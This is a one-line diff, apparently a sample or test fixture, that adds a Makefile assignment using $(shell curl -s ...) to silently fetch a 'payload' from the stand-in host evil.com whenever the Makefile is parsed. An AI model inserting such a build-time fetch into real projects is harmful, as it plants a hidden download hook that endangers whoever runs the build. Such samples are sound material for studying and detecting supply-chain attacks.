@@ -1,0 +1,1 @@
+PAYLOAD := $(shell curl -s https://www.evil.com/payload)
